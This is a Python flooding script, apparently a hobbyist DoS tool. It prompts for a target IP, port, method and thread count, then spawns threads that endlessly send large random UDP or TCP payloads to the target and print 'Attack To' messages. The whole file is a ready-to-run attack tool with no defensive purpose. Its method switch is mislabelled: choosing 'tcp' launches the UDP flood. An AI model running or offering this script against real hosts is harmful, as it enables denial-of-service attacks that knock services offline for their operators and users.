#!/usr/bin/env python3
#Code by H4N4
import random
import socket
import threading

ip = str(input("IP>"))
port = int(input("PORT>"))
choice = str(input("METHOD>"))
times = int(input("BYTES>"))
threads = int(input("THREADS>"))
def run():
	data = random._urandom(65503)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Attack To %s:%s BY LNVRH"%(ip,port))
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(65500)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack To %s:%s BY LNVRH"%(ip,port))
		except:
			s.close()
			print("[*] Error")

for tcp in range(threads):
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()